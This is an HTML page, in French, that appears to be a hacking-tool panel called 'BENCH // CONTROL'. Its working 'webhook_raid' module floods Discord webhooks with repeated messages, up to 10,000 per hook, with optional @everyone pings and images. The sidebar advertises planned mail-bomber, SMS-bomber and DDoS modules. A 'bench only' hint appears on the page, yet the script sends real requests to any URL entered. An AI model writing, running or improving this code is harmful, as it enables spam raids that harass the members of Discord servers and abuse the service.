<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BENCH // CONTROL</title>
<style>
  :root {
    --bg: #05070a; --panel: #0a0e14; --panel-2: #0d131c; --border: #1a2332;
    --text: #c8d6e5; --dim: #52606d; --green: #00ff9d; --green-dim: #0a5c3f;
    --amber: #ffb000; --red: #ff3860;
    --font: 'JetBrains Mono', 'Fira Code', 'SF Mono', Consolas, monospace;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background: linear-gradient(rgba(0,255,157,0.02) 1px, transparent 1px) 0 0/100% 24px,
                linear-gradient(90deg, rgba(0,255,157,0.02) 1px, transparent 1px) 0 0/24px 100%,
                radial-gradient(ellipse at top, #0a1420 0%, #05070a 60%);
    color: var(--text); font-family: var(--font); font-size: 14px;
    min-height: 100vh; padding: 2rem 1rem; display: flex; justify-content: center;
  }
  
  .frame { width: 100%; max-width: 1000px; border: 1px solid var(--border); background: var(--panel);
    box-shadow: 0 0 0 1px #000, 0 20px 80px -20px rgba(0,255,157,0.15); position: relative; display: flex; flex-direction: column; min-height: 600px; }
  .frame::before, .frame::after { content: ''; position: absolute; width: 12px; height: 12px; border: 1px solid var(--green); }
  .frame::before { top: -1px; left: -1px; border-right: 0; border-bottom: 0; }
  .frame::after { bottom: -1px; right: -1px; border-left: 0; border-top: 0; }
  
  .topbar { display: flex; justify-content: space-between; align-items: center; padding: 0.75rem 1.25rem;
    background: var(--panel-2); border-bottom: 1px solid var(--border); font-size: 0.75rem;
    letter-spacing: 0.15em; text-transform: uppercase; }
  .topbar .brand { color: var(--green); font-weight: 700; }
  .topbar .brand .dim { color: var(--dim); font-weight: 400; }
  .topbar .meta { display: flex; gap: 1.5rem; color: var(--dim); }
  .topbar .meta .val { color: var(--text); }
  .pulse-dot { display: inline-block; width: 6px; height: 6px; background: var(--green); border-radius: 50%;
    box-shadow: 0 0 8px var(--green); margin-right: 0.5rem; animation: pulse 1.5s infinite; vertical-align: middle; }
  @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }
  
  .main { display: grid; grid-template-columns: 240px 1fr; flex: 1; }
  .sidebar { background: var(--panel-2); border-right: 1px solid var(--border); padding: 1.25rem 0; }
  .sidebar-label { padding: 0 1.25rem; font-size: 0.65rem; color: var(--dim); letter-spacing: 0.2em;
    text-transform: uppercase; margin-bottom: 0.75rem; }
  .nav-item { padding: 0.7rem 1.25rem; cursor: pointer; display: flex; align-items: center; gap: 0.7rem;
    font-size: 0.85rem; color: var(--dim); border-left: 2px solid transparent; transition: all 0.15s; }
  .nav-item:hover { color: var(--text); background: rgba(0,255,157,0.03); }
  .nav-item.active { color: var(--green); background: rgba(0,255,157,0.06); border-left-color: var(--green); }
  .nav-item .icon { width: 8px; height: 8px; border: 1px solid currentColor; flex-shrink: 0; }
  .nav-item.active .icon { background: var(--green); }
  .nav-item .badge { margin-left: auto; font-size: 0.65rem; color: var(--amber); }
  
  /* MODULES SOON (Bloqués) */
  .nav-item.wip { opacity: 0.4; cursor: default; pointer-events: none; }
  .nav-item.wip .badge { color: var(--red); border: 1px solid var(--red); padding: 0 4px; border-radius: 2px; }
  
  .content { padding: 2rem; display: flex; flex-direction: column; gap: 1.5rem; position: relative; overflow-y: auto;}

  #app-screen { display: flex; flex-direction: column; gap: 1.5rem; width: 100%; }

  .module-head { display: flex; justify-content: space-between; align-items: flex-start; padding-bottom: 1rem; border-bottom: 1px solid var(--border); }
  .module-head h2 { font-size: 1rem; font-weight: 600; letter-spacing: 0.05em; }
  .module-head .path { font-size: 0.7rem; color: var(--dim); margin-top: 0.25rem; letter-spacing: 0.1em; }
  .module-head .status-chip { font-size: 0.65rem; letter-spacing: 0.15em; padding: 0.3rem 0.7rem; border: 1px solid var(--green-dim); color: var(--green); text-transform: uppercase; }
  
  .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
  .field { display: flex; flex-direction: column; gap: 0.4rem; }
  .field.full { grid-column: 1 / -1; }
  .field label { font-size: 0.65rem; color: var(--dim); letter-spacing: 0.2em; text-transform: uppercase; }
  .field label .req { color: var(--red); }
  .field input, .field textarea, .field select { background: var(--bg); border: 1px solid var(--border); color: var(--text); font-family: var(--font); font-size: 0.85rem; padding: 0.65rem 0.8rem; outline: none; transition: all 0.15s; }
  .field input:focus, .field textarea:focus, .field select:focus { border-color: var(--green); box-shadow: 0 0 0 1px var(--green), 0 0 12px -2px var(--green); background: #060a10; }
  .field textarea { min-height: 80px; resize: vertical; line-height: 1.5; }
  
  .action-bar { display: flex; justify-content: space-between; align-items: center; padding-top: 1rem; border-top: 1px solid var(--border); }
  .hint { font-size: 0.7rem; color: var(--dim); }
  .hint .warn { color: var(--amber); }
  button.run { background: transparent; border: 1px solid var(--green); color: var(--green); font-family: var(--font); font-size: 0.8rem; font-weight: 600; letter-spacing: 0.2em; text-transform: uppercase; padding: 0.75rem 2rem; cursor: pointer; transition: all 0.15s; }
  button.run:hover { background: var(--green); color: var(--bg); box-shadow: 0 0 24px -4px var(--green); }
  button.run:disabled { border-color: var(--dim); color: var(--dim); cursor: wait; background: transparent; box-shadow: none; }
  
  .console { background: #030507; border: 1px solid var(--border); display: flex; flex-direction: column; }
  .console-head { padding: 0.5rem 0.9rem; background: var(--panel-2); border-bottom: 1px solid var(--border); font-size: 0.65rem; letter-spacing: 0.2em; color: var(--dim); text-transform: uppercase; display: flex; justify-content: space-between; }
  .console-body { padding: 0.9rem; height: 240px; overflow-y: auto; font-size: 0.78rem; line-height: 1.7; }
  .log-line { display: flex; gap: 0.75rem; }
  .log-line .ts { color: var(--dim); flex-shrink: 0; }
  .log-line .lvl { flex-shrink: 0; width: 3.5em; text-align: right; font-weight: 600; }
  .log-line .msg { flex: 1; word-break: break-word; }
  .log-line.info .lvl { color: #4a9eff; } .log-line.info .msg { color: var(--text); }
  .log-line.ok .lvl { color: var(--green); } .log-line.ok .msg { color: var(--green); }
  .log-line.warn .lvl { color: var(--amber); } .log-line.warn .msg { color: var(--amber); }
  .log-line.err .lvl { color: var(--red); } .log-line.err .msg { color: var(--red); }
  
  @media (max-width: 720px) { .main { grid-template-columns: 1fr; } .sidebar { border-right: 0; border-bottom: 1px solid var(--border); } .form-grid { grid-template-columns: 1fr; } }
</style>
</head>
<body>

<div class="frame">
  <div class="topbar">
    <div class="brand">BENCH<span class="dim"> // CONTROL</span></div>
    <div class="meta">
      <span><span class="pulse-dot"></span>LINK <span class="val">UP</span></span>
      <span>SESSION <span class="val">ACTIVE</span></span>
    </div>
  </div>
  
  <div class="main">
    <aside class="sidebar">
      <div class="sidebar-label">// MODULES</div>
      
      <div class="nav-item active" id="nav-raid" onclick="switchTab('raid')">
        <span class="icon"></span><span>webhook_raid</span><span class="badge">HOOK</span>
      </div>
      
      <div class="nav-item wip">
        <span class="icon"></span><span>mail_bomber</span><span class="badge">SOON</span>
      </div>
      <div class="nav-item wip">
        <span class="icon"></span><span>SMS_bomber</span><span class="badge">SOON</span>
      </div>
      <div class="nav-item wip">
        <span class="icon"></span><span>tg_mail_proxy</span><span class="badge">SOON</span>
      </div>
      <div class="nav-item wip">
        <span class="icon"></span><span>DDos_voc</span><span class="badge">SOON</span>
      </div>
      <div class="nav-item wip">
        <span class="icon"></span><span>lookup</span><span class="badge">SOON</span>
      </div>
      
    </aside>
    
    <section class="content" id="app-screen">
        <div class="module-head">
          <div><h2 id="mod-title">webhook_raid</h2><div class="path" id="mod-path">/modules/discord/webhook</div></div>
          <div class="status-chip" id="status-chip">idle</div>
        </div>

        <div class="panel" id="panel-raid">
          <div class="form-grid">
            <div class="field full"><label>Webhook URL(s) <span class="req">*</span></label><textarea id="raid-webhooks" placeholder="https://discord.com/api/webhooks/..."></textarea></div>
            <div class="field"><label>Type de message</label>
              <select id="raid-type"><option value="normal">Normal</option><option value="embed">Embed</option><option value="mention">@everyone</option></select>
            </div>
            <div class="field"><label>Spam count (par hook)</label><input type="number" id="raid-count" value="50" min="1" max="10000"></div>
            <div class="field full"><label>Message content</label><textarea id="raid-message" placeholder="Votre message ici...">RAIDED</textarea></div>
            <div class="field"><label>Speed (ms)</label><input type="number" id="raid-speed" value="400" min="100"></div>
            <div class="field full"><label>URL Image Principale (Embed Image)</label><input type="text" id="raid-image-main" placeholder="https://i.imgur.com/example.png"></div>
          </div>
        </div>

        <div class="action-bar" id="action-bar">
          <div class="hint"><span class="warn">!</span> bench only — no live targets</div>
          <button class="run" id="run-btn" onclick="executeTool()">execute</button>
        </div>
        
        <div class="console" id="main-console">
          <div class="console-head"><span>stdout / stderr</span><span>auto-scroll: on</span></div>
          <div class="console-body" id="console">
            <div class="log-line info"><span class="ts">00:00:00</span><span class="lvl">INFO</span><span class="msg">bench initialized</span></div>
          </div>
        </div>
    </section>
  </div>
</div>

<script>
  let currentMod = 'raid';

  function switchTab(tabId) {
    if(!tabId) return;
    currentMod = tabId;
  }

  function logConsole(level, msg) {
    const d = new Date();
    const ts = d.toLocaleTimeString('fr-FR', { hour12: false });
    const labels = { info: 'INFO', ok: 'OK', warn: 'WARN', err: 'ERR' };
    const line = document.createElement('div');
    line.className = `log-line ${level}`;
    line.innerHTML = `<span class="ts">${ts}</span><span class="lvl">${labels[level]}</span><span class="msg">${escapeHtml(msg)}</span>`;
    document.getElementById('console').appendChild(line);
    document.getElementById('console').scrollTop = document.getElementById('console').scrollHeight;
  }

  function escapeHtml(s) {
    return String(s).replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
  }

  async function executeTool() {
    const runBtn = document.getElementById('run-btn');
    const statusChip = document.getElementById('status-chip');
    if (runBtn.disabled) return;
    
    runBtn.disabled = true;
    statusChip.textContent = 'running';
    statusChip.style.color = 'var(--amber)';
    statusChip.style.borderColor = 'var(--amber)';
    
    try {
      if (currentMod === 'raid') await runRaid();
    } catch (e) { logConsole('err', 'unhandled: ' + e.message); }
    finally {
      runBtn.disabled = false;
      statusChip.textContent = 'idle';
      statusChip.style.color = 'var(--green)';
      statusChip.style.borderColor = 'var(--green-dim)';
    }
  }

  async function runRaid() {
    const hooksRaw = document.getElementById('raid-webhooks').value.trim();
    const content = document.getElementById('raid-message').value;
    const count = parseInt(document.getElementById('raid-count').value);
    const type = document.getElementById('raid-type').value;
    const delay = parseInt(document.getElementById('raid-speed').value);
    const imageUrl = document.getElementById('raid-image-main').value.trim();

    if (!hooksRaw) { logConsole('err', 'aucun webhook fourni'); return; }
    if (!content) { logConsole('err', 'message vide'); return; }

    const hooks = hooksRaw.split(/[\n\s]+/).filter(u => u.startsWith('http'));
    if (hooks.length === 0) { logConsole('err', 'URLs invalides'); return; }

    logConsole('info', `webhook_raid → ${hooks.length} hook(s) · ${count} msg/hook`);

    let totalSent = 0;
    const totalTarget = hooks.length * count;

    for (let h = 0; h < hooks.length; h++) {
      const hook = hooks[h];
      logConsole('info', `hooking → ${hook.substring(0, 50)}...`);
      
      for (let i = 0; i < count; i++) {
        let payload = {};
        if (type === 'embed') {
          let embed = { description: content.replace(/\{n\}/g, i+1), color: 0x00ff9d };
          if (imageUrl) embed.image = { url: imageUrl };
          payload = { embeds: [embed] };
        } else {
          let finalContent = content.replace(/\{n\}/g, i+1);
          if (type === 'mention') finalContent = '@everyone ' + finalContent;
          payload = { content: finalContent };
          if (imageUrl) payload.embeds = [{ image: { url: imageUrl } }];
        }

        try {
          const res = await fetch(hook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
          if (res.ok || res.status === 204) {
            totalSent++;
            logConsole('ok', `hook#${h+1} msg#${i+1}/${count} → ${totalSent}/${totalTarget}`);
          } else {
            logConsole('err', `hook#${h+1} msg#${i+1} failed (${res.status})`);
          }
        } catch (e) {
          logConsole('err', `hook#${h+1} msg#${i+1} erreur réseau`);
        }
        await new Promise(r => setTimeout(r, delay));
      }
    }
    logConsole('ok', `raid terminé · ${totalSent} messages envoyés`);
  }
</script>
</body>
</html>
